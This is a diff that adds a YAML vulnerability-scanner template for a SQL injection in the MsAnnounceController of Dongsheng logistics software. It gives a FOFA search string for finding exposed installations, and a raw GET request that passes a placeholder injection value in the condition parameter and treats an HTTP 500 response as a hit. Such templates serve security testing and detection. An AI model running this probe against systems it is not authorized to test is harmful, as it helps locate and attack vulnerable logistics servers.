@@ -1,0 +1,21 @@
+id: poc-dyhrsfiwow6rg7uf
+info:
+  name: 东胜物流软件 MsAnnounceController 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dyhrsfiwow6rg7uf'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dyhrsfiwow6rg7uf
+    fofa: app="东胜物流软件-物流软件"
+http:
+- raw:
+  - 'GET /MvcShipping/MsAnnounce/GetData?handle=edit&condition=SQLI_POC HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
